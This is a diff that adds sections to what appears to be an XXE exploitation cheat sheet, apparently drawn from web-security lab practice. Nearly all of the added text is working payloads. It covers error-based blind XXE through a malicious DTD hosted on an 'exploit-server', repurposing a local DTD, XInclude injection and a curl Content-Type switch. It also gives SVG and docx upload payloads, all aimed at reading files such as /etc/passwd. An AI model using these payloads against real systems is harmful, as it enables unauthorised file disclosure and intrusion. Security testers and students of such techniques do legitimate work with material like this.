@@ -130,6 +130,95 @@ Targets: transform endpoints, reporting engines (XSLT/Jasper/FOP), xml-styleshee
 - PHP: `php://filter`, `expect://` (when module enabled)
 - Gopher: craft raw requests to Redis/FCGI when client allows non-HTTP schemes
 
+### Error-Based Blind XXE (Practitioner Critical)
+
+When the application does not display entity values inline but does show XML parse errors, force the parser to include file contents inside error messages:
+
+**Step 1**: Host this DTD on your server (e.g., `https://exploit-server/evil.dtd`):
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+
+**Step 2**: Submit this XXE payload:
+```xml
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-server/evil.dtd"> %xxe;]>
+<stockCheck><productId>1</productId></stockCheck>
+```
+
+**Result**: Parser tries to load `file:///nonexistent/<contents-of-etc-passwd>`, producing an error message that includes the file contents.
+
+**Alternative — repurpose local DTD for error-based XXE** (when OOB is blocked):
+```xml
+<!DOCTYPE foo [
+  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+  <!ENTITY % ISOamso '
+    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+    &#x25;eval;
+    &#x25;error;
+  '>
+  %local_dtd;
+]>
+<stockCheck><productId>1</productId></stockCheck>
+```
+
+Common local DTDs to try:
+- Linux: `/usr/share/yelp/dtd/docbookx.dtd`, `/usr/share/xml/fontconfig/fonts.dtd`
+- Windows: `C:\Windows\System32\wbem\xml\cim20.dtd`
+
+### XInclude in Data Fields (When You Can't Control DOCTYPE)
+
+When the application embeds your input inside a server-side XML document (e.g., a SOAP body or data field), you cannot inject a DOCTYPE. Use XInclude instead:
+
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+```
+
+**In a single parameter value:**
+```
+productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
+```
+
+### Content-Type Switching (Form to XML)
+
+Many APIs accept XML even when the default content type is form-encoded or JSON. Switch the Content-Type header:
+
+```bash
+# Original request
+curl -X POST https://TARGET/api/check \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "productId=1&storeId=1"
+
+# XXE via content-type switch
+curl -X POST https://TARGET/api/check \
+  -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'
+
+# Also try: text/xml, application/xhtml+xml
+```
+
+### XXE via File Upload
+
+**SVG with XXE:**
+```xml
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
+  <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+```
+
+**OOXML (docx/xlsx) with XXE:**
+1. Create a normal .docx file
+2. Unzip it: `unzip doc.docx -d doc_extracted`
+3. Edit `doc_extracted/word/document.xml` — inject entity in the XML prolog
+4. Repackage: `cd doc_extracted && zip -r ../evil.docx .`
+
 ## Bypass Techniques
 
 **Encoding Variants**
